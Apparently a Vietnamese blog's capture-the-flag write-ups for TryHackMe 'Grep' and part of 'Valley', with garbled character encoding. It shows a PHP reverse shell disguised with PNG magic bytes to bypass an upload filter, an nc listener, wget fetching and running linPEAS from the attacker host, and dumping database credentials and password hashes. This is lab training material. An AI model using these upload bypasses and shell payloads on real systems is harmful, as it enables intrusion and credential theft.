OS: Linux; CPE: cpe:/o:linux:linux_kernel TÃ´i Ä‘á»ƒ Ã½ tháº¥y cÃ³ grep.thm, váº­y nÃªn tÃ´i sáº½ thá»­ thÃªm domain vÃ o file hosts\nâ”Œâ”€â”€(rootã‰¿kali)-[/home/kali] â””â”€# nano /etc/hosts 127.0.0.1 localhost 127.0.1.1 kali 10.10.114.67 grep.thm *.grep.thm ::1 localhost ip6-localhost ip6-loopback ff02::1 ip6-allnodes ff02::2 ip6-allrouters Truy cáº­p vÃ o https://grep.thm, tÃ´i Ä‘Æ°á»£c 1 site login\ná» Ä‘Ã¢y cÃ³ 1 site login vÃ  1 site register. TÃ´i Ä‘Ã£ thá»­ vÃ i cÃ¡ch Ä‘Æ¡n giáº£n Ä‘á»ƒ thá»­ bypass qua nhÆ°ng khÃ´ng login Ä‘Æ°á»£c, vá»›i site register thÃ¬ tÃ´i cáº§n pháº£i cÃ³ API key má»›i cÃ³ thá»ƒ Ä‘Äƒng kÃ½ Ä‘Æ°á»£c tÃ i khoáº£n\nSau má»™t lÃºc tÃ¬m kiáº¿m xung quanh mÃ  khÃ´ng tháº¥y cÃ³ gÃ¬ kháº£ quan vá» API, tÃ´i nghÄ© Ä‘áº¿n viá»‡c thá»­ tÃ¬m thÃ´ng tin vá» SearchMe, cÃ³ thá»ƒ lÃ  tÃªn cá»§a má»™t theme hoáº·c cms nÃ o Ä‘Ã³.\nTrÃªn github tÃ´i tÃ¬m tháº¥y source supersecuredeveloper/searchmecms: In progress\u0026hellip; má»›i Ä‘Æ°á»£c táº¡o 4 thÃ¡ng trÆ°á»›c, khÃ¡ trÃ¹ng vá»›i thá»i Ä‘iá»ƒm mÃ¡y nÃ y Ä‘Æ°á»£c táº¡o trÃªn Tryhackme, nÃ³ cÅ©ng cÃ³ pháº§n api nhÆ° tÃ´i Ä‘ang tÃ¬m kiáº¿m\nCÃ³ 4 commits, vÃ  sau khi kiá»ƒm tra cÃ¡c commit nÃ y tÃ´i tÃ¬m tháº¥y api key\nSá»­ dá»¥ng api key Ä‘á»ƒ Ä‘Äƒng kÃ½ tÃ i khoáº£n\nÄÄƒng nháº­p vá»›i tÃ i khoáº£n vá»«a táº¡o tÃ´i Ä‘Æ°á»£c flag Ä‘áº§u tiÃªn\nRCE # Tiáº¿p tá»¥c vá»›i source code tÃ¬m Ä‘Æ°á»£c trÃªn github, tÃ´i cÃ²n má»™t pháº§n ná»¯a lÃ  upload.php. TÃ¬m nÃ³ trÃªn web\nTáº­p trung vÃ o Ä‘oáº¡n nÃ y trong source\n$allowedExtensions = [\u0026#39;jpg\u0026#39;, \u0026#39;jpeg\u0026#39;, \u0026#39;png\u0026#39;, \u0026#39;bmp\u0026#39;]; $validMagicBytes = [ \u0026#39;jpg\u0026#39; =\u0026gt; \u0026#39;ffd8ffe0\u0026#39;, \u0026#39;png\u0026#39; =\u0026gt; \u0026#39;89504e47\u0026#39;, \u0026#39;bmp\u0026#39; =\u0026gt; \u0026#39;424d\u0026#39; ]; Chá»‰ cÃ³ cÃ¡c Ä‘uÃ´i file phÃ­a trÃªn má»›i Ä‘Æ°á»£c phÃ©p upload, vÃ  Ä‘áº§u file cÅ©ng pháº£i giá»‘ng vá»›i cÃ¡c chuá»—i Ä‘Æ°á»£c quy Ä‘á»‹nh.\nÄáº§u tiÃªn tÃ´i sáº½ Ä‘á»•i tÃªn file thÃ nh Ä‘uÃ´i png vÃ  dÃ¹ng hexeditor Ä‘á»ƒ Ä‘á»•i cÃ¡c giÃ¡ trá»‹ Ä‘áº§u cá»§a file\nâ”Œâ”€â”€(rootã‰¿kali)-[/home/kali] â””â”€# mv phpshell.php phpshell..php â”Œâ”€â”€(rootã‰¿kali)-[/home/kali] â””â”€# hexeditor phpshell..php File: phpshell.php. ASCII Offset: 0x00000004 / 0x00000A18 (%00) M 00000000 89 50 4E 47 70 0A 2F 2F 20 70 68 70 2D 72 65 76 Táº£i file lÃªn\n{\u0026#34;message\u0026#34;:\u0026#34;File uploaded successfully.\u0026#34;} Tuy nhiÃªn tÃ´i gáº·p lá»—i khi má»Ÿ file the image cannot be displayed because it contains errors. Sau má»™t lÃºc tÃ¬m hiá»ƒu thÃ¬ tÃ´i nháº­n ra mÃ¬nh cáº§n pháº£i thay Ä‘á»•i cÃ¡c file shell ná»¯a.\nShell cá»§a tÃ´i sau khi Ä‘á»•i Ä‘uÃ´i vÃ  cÃ¡c giÃ¡ trá»‹ Ä‘áº§u\nï¿½PNGp // php-reverse-shell - A Reverse Shell implementation in PHP. Comments stripped to slim it down. RE: https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php // Copyright (C) 2007 pentestmonkey@pentestmonkey.net set_time_limit (0); $VERSION = \u0026#34;1.0\u0026#34;; $ip = \u0026#39;10.9.102.40\u0026#39;; $port = 9001; $chunk_size = 1400; $write_a = null; $error_a = null; $shell = \u0026#39;uname -a; w; id; sh -i\u0026#39;; $daemon = 0; $debug = 0; NÃ³ Ä‘Ã£ máº¥t Ä‘á»‹nh dáº¡ng php. TÃ´i cáº§n thÃªm vÃ i kÃ½ tá»± Ä‘áº§u trÆ°á»›c \u0026lt;?php náº¿u khÃ´ng muá»‘n máº¥t Ä‘á»‹nh dáº¡ng tháº­t cá»§a file\n....\u0026lt;?php // php-reverse-shell - A Reverse Shell implementation in PHP. Comments stripped to slim it down. RE: https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php // Copyright (C) 2007 pentestmonkey@pentestmonkey.net set_time_limit (0); $VERSION = \u0026#34;1.0\u0026#34;; $ip = \u0026#39;10.9.102.40\u0026#39;; $port = 9001; $chunk_size = 1400; $write_a = null; $error_a = null; $shell = \u0026#39;uname -a; w; id; sh -i\u0026#39;; $daemon = 0; $debug = 0; Sau khi thay Ä‘á»•i cÃ¡c giÃ¡ trá»‹ Ä‘áº§u cá»§a file nÃ³ sáº½ trá»Ÿ thÃ nh nhÆ° sau\nï¿½PNG\u0026lt;?php // php-reverse-shell - A Reverse Shell implementation in PHP. Comments stripped to slim it down. RE: https://raw.githubuserc\u0026gt; // Copyright (C) 2007 pentestmonkey@pentestmonkey.net set_time_limit (0); $VERSION = \u0026#34;1.0\u0026#34;; $ip = \u0026#39;10.9.102.40\u0026#39;; $port = 9001; $chunk_size = 1400; $write_a = null; $error_a = null; $shell = \u0026#39;uname -a; w; id; sh -i\u0026#39;; $daemon = 0; $debug = 0; Upload láº¡i vÃ  táº¡o listener port 9001\nVÃ o https://grep.thm/api/uploads/ Ä‘á»ƒ má»Ÿ file vá»«a upload\nâ”Œâ”€â”€(rootã‰¿kali)-[/home/kali] â””â”€# nc -lnvp 9001 listening on [any] 9001 ... connect to [10.9.102.40] from (UNKNOWN) [10.10.221.7] 60196 Linux ip-10-10-221-7 5.15.0-1038-aws #43~20.04.1-Ubuntu SMP Fri Jun 2 17:10:57 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux 03:10:28 up 55 min, 0 users, load average: 0.00, 0.00, 0.00 USER TTY FROM LOGIN@ IDLE JCPU PCPU WHAT uid=33(www-data) gid=33(www-data) groups=33(www-data) sh: 0: can\u0026#39;t access tty; job control turned off $ Äá»ƒ Ä‘á»¡ máº¥t thá»i gian thÃ¬ tÃ´i sáº½ táº£i linPEAS lÃªn mÃ¡y nÃ y Ä‘á»ƒ nÃ³ phÃ¢n tÃ­ch\nwww-data@ip-10-10-221-7:/$ cd /tmp www-data@ip-10-10-221-7:/tmp$ wget http://10.9.102.40:8888/linpeas.sh --2023-09-05 03:21:42-- http://10.9.102.40:8888/linpeas.sh Connecting to 10.9.102.40:8888... connected. HTTP request sent, awaiting response... 200 OK Length: 848400 (829K) [text/x-sh] Saving to: â€˜linpeas.shâ€™ linpeas.sh 100%[===================\u0026gt;] 828.52K 502KB/s in 1.7s 2023-09-05 03:21:44 (502 KB/s) - â€˜linpeas.shâ€™ saved [848400/848400] www-data@ip-10-10-221-7:/tmp$ chmod +x linpeas.sh www-data@ip-10-10-221-7:/tmp$ ./linpeas.sh Äáº§u tiÃªn, tÃ´i cÃ³ má»™t subdomain má»›i lÃ  leakchecker.grep.thm vá»›i port 51337\n\u0026lt;VirtualHost *:51337\u0026gt; ServerAdmin webmaster@leakchecker.grep.thm ServerName leakchecker.grep.thm DocumentRoot /var/www/leakchecker \u0026lt;IfModule mpm_itk_module\u0026gt; AssignUserId ubuntu ubuntu \u0026lt;/IfModule\u0026gt; ErrorLog ${APACHE_LOG_DIR}/error.log CustomLog ${APACHE_LOG_DIR}/access.log combined SSLEngine on SSLCertificateFile /var/www/leak_certificate.crt SSLCertificateKeyFile /var/www/private_unencrypted.key \u0026lt;/VirtualHost\u0026gt; Tiáº¿p theo, tÃ´i cÃ³ má»™t file config db cá»§a php\nâ•”â•â•â•â•â•â•â•â•â•â•â•£ Readable files belonging to root and readable by me but not world readable -rw-r----- 1 root www-data 524 Nov 11 2021 /etc/phpmyadmin/config-db.php Cuá»‘i cÃ¹ng, tÃ´i cÃ³ má»™t thÆ° má»¥c backup trong web\nâ•”â•â•â•â•â•â•â•â•â•â•â•£ Web files?(output limit) /var/www/: total 48K drwxr-xr-x 6 ubuntu www-data 4.0K Jun 14 12:57 . drwxr-xr-x 14 root root 4.0K Nov 10 2021 .. drwxr-xr-x 2 ubuntu www-data 4.0K Jun 14 11:25 backup -rw-r--r-- 1 root root 1.2K Jun 14 13:03 certificate.crt -rw-r--r-- 1 root root 960 Jun 2 14:47 certificate.csr drwxr-xr-x 2 ubuntu www-data 4.0K Jun 14 11:44 default_html drwxr-xr-x 4 ubuntu www-data 4.0K Jun 7 12:14 html -rw-r--r-- 1 root root 1.2K Jun 14 12:58 leak_certificate.crt ThÃªm subdomain vÃ o file hosts\n127.0.0.1 localhost 127.0.1.1 kali 10.10.114.67 grep.thm leakchecker.grep.thm ::1 localhost ip6-localhost ip6-loopback ff02::1 ip6-allnodes ff02::2 ip6-allrouters Site yÃªu cáº§u email, tuy nhiÃªn nháº­p thá»­ mail tÃ´i vá»«a Ä‘Äƒng á»Ÿ tÃ i khoáº£n phÃ­a trÃªn thÃ¬ khÃ´ng Ä‘Æ°á»£c.\nTiáº¿p theo lÃ  file config db\nwww-data@ip-10-10-221-7:/tmp$ cat /etc/phpmyadmin/config-db.php \u0026lt;?php ## ## database access settings in php format ## automatically generated from /etc/dbconfig-common/phpmyadmin.conf ## by /usr/sbin/dbconfig-generate-include ## ## by default this file is managed via ucf, so you shouldn\u0026#39;t have to ## worry about manual changes being silently discarded. *however*, ## you\u0026#39;ll probably also want to edit the configuration file mentioned ## above too. ## $dbuser=\u0026#39;phpmyadmin\u0026#39;; $dbpass=\u0026#39;tryhackme\u0026#39;; $basepath=\u0026#39;\u0026#39;; $dbname=\u0026#39;phpmyadmin\u0026#39;; $dbserver=\u0026#39;localhost\u0026#39;; $dbport=\u0026#39;3306\u0026#39;; $dbtype=\u0026#39;mysql\u0026#39;; ThÆ° má»¥c backup\nwww-data@ip-10-10-221-7:/tmp$ ls -la /var/www/backup/ total 12 drwxr-xr-x 2 ubuntu www-data 4096 Jun 14 11:25 . drwxr-xr-x 6 ubuntu www-data 4096 Jun 14 12:57 .. -rw-rw-r-- 1 ubuntu ubuntu 1888 Jun 14 11:25 users.sql www-data@ip-10-10-221-7:/tmp$ cat /var/www/backup/users.sql -- phpMyAdmin SQL Dump -- version 5.2.1 -- https://www.phpmyadmin.net/ -- -- Host: 127.0.0.1 -- Generation Time: May 30, 2023 at 01:25 PM -- Server version: 10.4.28-MariaDB -- PHP Version: 8.0.28 SET SQL_MODE = \u0026#34;NO_AUTO_VALUE_ON_ZERO\u0026#34;; START TRANSACTION; SET time_zone = \u0026#34;+00:00\u0026#34;; /*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */; /*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */; /*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */; /*!40101 SET NAMES utf8mb4 */; -- -- Database: `postman` -- -- -------------------------------------------------------- -- -- Table structure for table `users` -- CREATE TABLE `users` ( `id` int(11) NOT NULL, `username` varchar(50) NOT NULL, `password` varchar(255) NOT NULL, `email` varchar(100) NOT NULL, `name` varchar(100) DEFAULT NULL, `role` varchar(20) DEFAULT \u0026#39;user\u0026#39; ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci; -- -- Dumping data for table `users` -- INSERT INTO `users` (`id`, `username`, `password`, `email`, `name`, `role`) VALUES (1, \u0026#39;test\u0026#39;, \u0026#39;$2y$10$dE6VAdZJCN4repNAFdsO2ePDr3StRdOhUJ1O/41XVQg91qBEBQU3G\u0026#39;, \u0026#39;test@grep.thm\u0026#39;, \u0026#39;Test User\u0026#39;, \u0026#39;user\u0026#39;), (2, \u0026#39;admin\u0026#39;, \u0026#39;$2y$10$3V62f66VxzdTzqXF4WHJI.Mpgcaj3WxwYsh7YDPyv1xIPss4qCT9C\u0026#39;, \u0026#39;admin@searchme2023cms.grep.thm\u0026#39;, \u0026#39;Admin User\u0026#39;, \u0026#39;admin\u0026#39;); -- -- Indexes for dumped tables -- -- -- Indexes for table `users` -- ALTER TABLE `users` ADD PRIMARY KEY (`id`), ADD UNIQUE KEY `username` (`username`), ADD UNIQUE KEY `email` (`email`); -- -- AUTO_INCREMENT for dumped tables -- -- -- AUTO_INCREMENT for table `users` -- ALTER TABLE `users` MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=3; COMMIT; /*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */; /*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */; /*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */; www-data@ip-10-10-221-7:/tmp$ Email cá»§a user admin lÃ  admin@searchme2023cms.grep.thm vÃ  password admin. Thá»­ nháº­p email nÃ y vÃ o leakchecker\n","date":"20 August 2023","externalUrl":null,"permalink":"/ctf/tryhackme/grep/","section":"Ctf","summary":"","title":"Tryhackme - Grep","type":"ctf"},{"content":"TryHackMe - Valley\nReconnaissance and Scanning # QuÃ©t nháº¹ cÃ¡i port\nPORT STATE SERVICE REASON VERSION 22/tcp open ssh syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 c2:84:2a:c1:22:5a:10:f1:66:16:dd:a0:f6:04:62:95 (RSA) | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCf7Zvn7fOyAWUwEI2aH/k8AyPehxzzuNC1v4AAlhDa4Off4085gRIH/EXpjOoZSBvo8magsCH32JaKMMc59FSK4canP2I0VrXwkEX0F8PjA1TV4qgqXJI0zNVwFrfBORDdlCPNYiqRNFp1vaxTqLOFuHt5r34134yRwczxTsD4Uf9Z6c7Yzr0GV6NL3baGHDeSZ/msTiFKFzLTTKbFkbU4SQYc7jIWjl0ylQ6qtWivBiavEWTwkHHKWGg9WEdFpU2zjeYTrDNnaEfouD67dXznI+FiiTiFf4KC9/1C+msppC0o77nxTGI0352wtBV9KjTU/Aja+zSTMDxoGVvo/BabczvRCTwhXxzVpWNe3YTGeoNESyUGLKA6kUBfFNICrJD2JR7pXYKuZVwpJUUCpy5n6MetnonUo0SoMg/fzqMWw2nCZOpKzVo9OdD8R/ZTnX/iQKGNNvgD7RkbxxFK5OA9TlvfvuRUQQaQP7+UctsaqG2F9gUfWorSdizFwfdKvRU= | 256 42:9e:2f:f6:3e:5a:db:51:99:62:71:c4:8c:22:3e:bb (ECDSA) | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBNIiJc4hdfcu/HtdZN1fyz/hU1SgSas1Lk/ncNc9UkfSDG2SQziJ/5SEj1AQhK0T4NdVeaMSDEunQnrmD1tJ9hg= | 256 2e:a0:a5:6c:d9:83:e0:01:6c:b9:8a:60:9b:63:86:72 (ED25519) |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEZhkboYdSkdR3n1G4sQtN4uO3hy89JxYkizKi6Sd/Ky 80/tcp open http syn-ack ttl 63 Apache httpd 2.4.41 ((Ubuntu)) |_http-server-header: Apache/2.4.41 (Ubuntu) | http-methods: |_ Supported Methods: OPTIONS HEAD GET POST |_http-title: Site doesn\u0026#39;t have a title (text/html). 37370/tcp open ftp syn-ack ttl 63 vsftpd 3.0.3 Service Info: OSs: Linux, Unix; CPE: cpe:/o:linux:linux_kernel Kiá»ƒm tra qua port 37370 ftp vá»›i user máº·c Ä‘á»‹nh nhÆ°ng khÃ´ng thu Ä‘Æ°á»£c káº¿t quáº£ gÃ¬, tÃ´i chuyá»ƒn qua port 80 vá»›i web service\nSau khi lÆ°á»›t qua 1 vÃ²ng trang web vÃ  khÃ´ng tháº¥y cÃ³ gÃ¬ ná»•i báº­t, Ä‘Æ¡n thuáº§n chá»‰ lÃ  1 trang web html, tÃ´i thá»­ tÃ¬m cÃ¡c directory báº±ng gobuster\nâ”Œâ”€â”€(rootã‰¿kali)-[/home/kali] â””â”€# gobuster dir -u http://10.10.35.151/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -t 100 =============================================================== Gobuster v3.5 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://10.10.35.151/ [+] Method: GET [+] Threads: 100 [+] Wordlist: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.5 [+] Timeout: 10s =============================================================== 2023/07/23 03:07:33 Starting gobuster in directory enumeration mode =============================================================== /gallery (Status: 301) [Size: 314] [--\u0026gt; http://10.10.35.151/gallery/] /static (Status: 301) [Size: 313] [--\u0026gt; http://10.10.35.151/static/] /pricing (Status: 301) [Size: 314] [--\u0026gt; http://10.10.35.151/pricing/] Progress: 87623 / 87665 (99.95%) =============================================================== 2023/07/23 03:11:09 Finished =============================================================== Vá»›i gallery thÃ¬ Ä‘Ã¢y lÃ  nÆ¡i show áº£nh, static lÃ  nÆ¡i chá»©a cÃ¡c áº£nh. Vá»›i pricing, trong nÃ y chá»©a 1 file note.txt\nJ, Please stop leaving notes randomly on the website -RP Äiá»u nÃ y cÃ³ nghÄ©a lÃ  trang web váº«n cÃ²n gÃ¬ Ä‘Ã³ á»Ÿ ngay front-end mÃ  tÃ´i chÆ°a tÃ¬m ra.\nQuay trá»Ÿ láº¡i gallery, source web cho tÃ´i thÃ´ng tin vá» pháº§n áº£nh.\n\u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;style\u0026gt; div.gallery { margin: 5px; border: 1px solid #ccc; float: left; width: 500px; } div.gallery:hover { border: 1px solid #777; } div.gallery img { width: 100%; height: 30%; } div.desc { padding: 15px; text-align: center; } \u0026lt;/style\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;button style=\u0026#34;height:100px;width:200px\u0026#34; onclick=\u0026#34;window.location.href = \u0026#39;/\u0026#39;;\u0026#34;\u0026gt; Return Home \u0026lt;/button\u0026gt; \u0026lt;div class=\u0026#34;gallery\u0026#34;\u0026gt; \u0026lt;a target=\u0026#34;_blank\u0026#34; href=\u0026#34;/static/1\u0026#34;\u0026gt; \u0026lt;img src=\u0026#34;/static/1\u0026#34; alt=\u0026#34;1\u0026#34; width=\u0026#34;1200\u0026#34; height=\u0026#34;800\u0026#34;\u0026gt; \u0026lt;/a\u0026gt; \u0026lt;div class=\u0026#34;desc\u0026#34;\u0026gt;Image taken of the rapids of the Potomac\u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;gallery\u0026#34;\u0026gt; \u0026lt;a target=\u0026#34;_blank\u0026#34; href=\u0026#34;/static/2\u0026#34;\u0026gt; \u0026lt;img src=\u0026#34;/static/2\u0026#34; alt=\u0026#34;2\u0026#34; width=\u0026#34;1200\u0026#34; height=\u0026#34;800\u0026#34;\u0026gt; \u0026lt;/a\u0026gt; \u0026lt;div class=\u0026#34;desc\u0026#34;\u0026gt;The stars, as bright as ever\u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;gallery\u0026#34;\u0026gt; \u0026lt;a target=\u0026#34;_blank\u0026#34; href=\u0026#34;/static/3\u0026#34;\u0026gt; \u0026lt;img src=\u0026#34;/static/3\u0026#34; alt=\u0026#34;3\u0026#34; width=\u0026#34;1200\u0026#34; height=\u0026#34;800\u0026#34;\u0026gt; \u0026lt;/a\u0026gt; \u0026lt;div class=\u0026#34;desc\u0026#34;\u0026gt;Picture taken of Blue lake at sunset\u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;gallery\u0026#34;\u0026gt; \u0026lt;a target=\u0026#34;_blank\u0026#34; href=\u0026#34;/static/4\u0026#34;\u0026gt; \u0026lt;img src=\u0026#34;/static/4\u0026#34; alt=\u0026#34;4\u0026#34; width=\u0026#34;1200\u0026#34; height=\u0026#34;800\u0026#34;\u0026gt; \u0026lt;/a\u0026gt; \u0026lt;div class=\u0026#34;desc\u0026#34;\u0026gt;Rocks reflecting the sunset\u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;gallery\u0026#34;\u0026gt; \u0026lt;a target=\u0026#34;_blank\u0026#34; href=\u0026#34;/static/5\u0026#34;\u0026gt; \u0026lt;img src=\u0026#34;/static/5\u0026#34; alt=\u0026#34;5\u0026#34; width=\u0026#34;1200\u0026#34; height=\u0026#34;800\u0026#34;\u0026gt; \u0026lt;/a\u0026gt; \u0026lt;div class=\u0026#34;desc\u0026#34;\u0026gt;Sunset can never be fully captured, but we sure can try\u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;gallery\u0026#34;\u0026gt; \u0026lt;a target=\u0026#34;_blank\u0026#34; href=\u0026#34;/static/6\u0026#34;\u0026gt; \u0026lt;img src=\u0026#34;/static/6\u0026#34; alt=\u0026#34;1\u0026#34; width=\u0026#34;1200\u0026#34; height=\u0026#34;800\u0026#34;\u0026gt; \u0026lt;/a\u0026gt; \u0026lt;div class=\u0026#34;desc\u0026#34;\u0026gt;Image taken of the Austrain Alps\u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;gallery\u0026#34;\u0026gt; \u0026lt;a target=\u0026#34;_blank\u0026#34; href=\u0026#34;/static/7\u0026#34;\u0026gt; \u0026lt;img src=\u0026#34;/static/7\u0026#34; alt=\u0026#34;1\u0026#34; width=\u0026#34;1200\u0026#34; height=\u0026#34;800\u0026#34;\u0026gt; \u0026lt;/a\u0026gt; \u0026lt;div class=\u0026#34;desc\u0026#34;\u0026gt;Image taken of a firework\u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;gallery\u0026#34;\u0026gt; \u0026lt;a target=\u0026#34;_blank\u0026#34; href=\u0026#34;/static/8\u0026#34;\u0026gt; \u0026lt;img src=\u0026#34;/static/8\u0026#34; alt=\u0026#34;1\u0026#34; width=\u0026#34;1200\u0026#34; height=\u0026#34;800\u0026#34;\u0026gt; \u0026lt;/a\u0026gt; \u0026lt;div class=\u0026#34;desc\u0026#34;\u0026gt;Snowcapped peaks below the moon\u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;gallery\u0026#34;\u0026gt; \u0026lt;a target=\u0026#34;_blank\u0026#34; href=\u0026#34;/static/9\u0026#34;\u0026gt; \u0026lt;img src=\u0026#34;/static/9\u0026#34; alt=\u0026#34;1\u0026#34; width=\u0026#34;1200\u0026#34; height=\u0026#34;800\u0026#34;\u0026gt; \u0026lt;/a\u0026gt; \u0026lt;div class=\u0026#34;desc\u0026#34;\u0026gt;Fire red sunset taken at just the right moment\u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;gallery\u0026#34;\u0026gt; \u0026lt;a target=\u0026#34;_blank\u0026#34; href=\u0026#34;/static/10\u0026#34;\u0026gt; \u0026lt;img src=\u0026#34;/static/10\u0026#34; alt=\u0026#34;1\u0026#34; width=\u0026#34;1200\u0026#34; height=\u0026#34;800\u0026#34;\u0026gt; \u0026lt;/a\u0026gt; \u0026lt;div class=\u0026#34;desc\u0026#34;\u0026gt;Mountain top view of Blue Lake\u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;gallery\u0026#34;\u0026gt; \u0026lt;a target=\u0026#34;_blank\u0026#34; href=\u0026#34;/static/11\u0026#34;\u0026gt; \u0026lt;img src=\u0026#34;/static/11\u0026#34; alt=\u0026#34;1\u0026#34; width=\u0026#34;1200\u0026#34; height=\u0026#34;800\u0026#34;\u0026gt; \u0026lt;/a\u0026gt; \u0026lt;div class=\u0026#34;desc\u0026#34;\u0026gt;Fog covered roads in the Mountains\u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;gallery\u0026#34;\u0026gt; \u0026lt;a target=\u0026#34;_blank\u0026#34; href=\u0026#34;/static/12\u0026#34;\u0026gt; \u0026lt;img src=\u0026#34;/static/12\u0026#34; alt=\u0026#34;1\u0026#34; width=\u0026#34;1200\u0026#34; height=\u0026#34;800\u0026#34;\u0026gt; \u0026lt;/a\u0026gt; \u0026lt;div class=\u0026#34;desc\u0026#34;\u0026gt;Fireside chats below the peaks\u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;gallery\u0026#34;\u0026gt; \u0026lt;a target=\u0026#34;_blank\u0026#34; href=\u0026#34;/static/13\u0026#34;\u0026gt; \u0026lt;img src=\u0026#34;/static/13\u0026#34; alt=\u0026#34;1\u0026#34; width=\u0026#34;1200\u0026#34; height=\u0026#34;800\u0026#34;\u0026gt; \u0026lt;/a\u0026gt; \u0026lt;div class=\u0026#34;desc\u0026#34;\u0026gt;European Castles\u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;gallery\u0026#34;\u0026gt; \u0026lt;a target=\u0026#34;_blank\u0026#34; href=\u0026#34;/static/14\u0026#34;\u0026gt; \u0026lt;img src=\u0026#34;/static/14\u0026#34; alt=\u0026#34;1\u0026#34; width=\u0026#34;1200\u0026#34; height=\u0026#34;800\u0026#34;\u0026gt; \u0026lt;/a\u0026gt; \u0026lt;div class=\u0026#34;desc\u0026#34;\u0026gt;Lakeside view of the Alps\u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;gallery\u0026#34;\u0026gt; \u0026lt;a target=\u0026#34;_blank\u0026#34; href=\u0026#34;/static/15\u0026#34;\u0026gt; \u0026lt;img src=\u0026#34;/static/15\u0026#34; alt=\u0026#34;1\u0026#34; width=\u0026#34;1200\u0026#34; height=\u0026#34;800\u0026#34;\u0026gt; \u0026lt;/a\u0026gt; \u0026lt;div class=\u0026#34;desc\u0026#34;\u0026gt;Sunset picture taken from the hillside\u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;gallery\u0026#34;\u0026gt; \u0026lt;a target=\u0026#34;_blank\u0026#34; href=\u0026#34;/static/16\u0026#34;\u0026gt; \u0026lt;img src=\u0026#34;/static/16\u0026#34; alt=\u0026#34;1\u0026#34; width=\u0026#34;1200\u0026#34; height=\u0026#34;800\u0026#34;\u0026gt; \u0026lt;/a\u0026gt; \u0026lt;div class=\u0026#34;desc\u0026#34;\u0026gt;Foggy mountainside\u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;gallery\u0026#34;\u0026gt; \u0026lt;a target=\u0026#34;_blank\u0026#34; href=\u0026#34;/static/17\u0026#34;\u0026gt; \u0026lt;img src=\u0026#34;/static/17\u0026#34; alt=\u0026#34;1\u0026#34; width=\u0026#34;1200\u0026#34; height=\u0026#34;800\u0026#34;\u0026gt; \u0026lt;/a\u0026gt; \u0026lt;div class=\u0026#34;desc\u0026#34;\u0026gt;The crossing of the lake towards the Alps\u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;gallery\u0026#34;\u0026gt; \u0026lt;a target=\u0026#34;_blank\u0026#34; href=\u0026#34;/static/18\u0026#34;\u0026gt; \u0026lt;img src=\u0026#34;/static/18\u0026#34; alt=\u0026#34;1\u0026#34; width=\u0026#34;1200\u0026#34; height=\u0026#34;800\u0026#34;\u0026gt; \u0026lt;/a\u0026gt; \u0026lt;div class=\u0026#34;desc\u0026#34;\u0026gt;Fun times with friends watching the orange sky\u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; Váº­y lÃ  cÃ¡c áº£nh Ä‘Æ°á»£c Ä‘Ã¡nh sá»‘ thá»© tá»± vÃ  Ä‘Æ°á»£c lÆ°u trong static, nhÆ°ng khi vÃ o static thÃ¬ á»Ÿ Ä‘Ã¢y trá»‘ng trÆ¡n, khÃ´ng cÃ³ gÃ¬ cáº£. Ráº¥t cÃ³ thá»ƒ trong nÃ y cÃ³ chá»©a má»™t cÃ¡i gÃ¬ Ä‘Ã³ khÃ¡c ngoÃ i 18 bá»©c áº£nh trÃªn nÃªn má»›i bá»‹ áº©n Ä‘i.\nTÃ´i sáº½ dÃ¹ng gobuster Ä‘á»ƒ thá»­ tÃ¬m cÃ¡c dir bá»‹ áº©n Ä‘áº±ng sau 